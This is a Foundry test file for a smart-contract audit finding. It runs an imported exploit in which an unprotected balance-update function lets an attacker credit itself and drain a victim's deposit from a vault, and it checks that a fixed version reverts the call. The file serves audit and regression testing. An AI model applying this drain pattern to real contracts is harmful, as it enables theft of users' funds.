// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, Erc20, PortfolioVault, AccountBookFixed} from "./34764-h-2-anyone-can-change-the-balance-of-an-account-to-drain-the.sol";

contract Finding34764Test is Test {
    function test_exploit_credits_then_drains_the_vault() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.taken(), e.STOLEN(), "attacker received the victim deposit");
        assertEq(e.vaultAfter(), e.SEED(), "vault kept only the attacker seed");
        assertEq(e.book().balanceOf(e.VICTIM()), e.VICTIM_DEPOSIT(), "victim book still shows the deposit");
        assertEq(e.credited(), e.SEED() + e.STOLEN(), "balance was written without a deposit");
    }

    function test_control_role_blocks_the_credit() public {
        Erc20 token = new Erc20();
        PortfolioVault vault = new PortfolioVault();
        AccountBookFixed book = new AccountBookFixed(token, vault, address(0x4444));
        vault.setBook(address(book));
        token.mint(address(this), 1_000_001e6);
        book.deposit(address(0x3333), 1_000_000e6);
        book.deposit(address(this), 1e6);
        vm.expectRevert(bytes("role"));
        book.batchUpdateAccountToken(address(this), int256(1_000_000e6));
        book.withdraw(1e6, address(this));
        assertEq(token.balanceOf(address(vault)), 1_000_000e6, "victim deposit stays in the vault");
    }
}
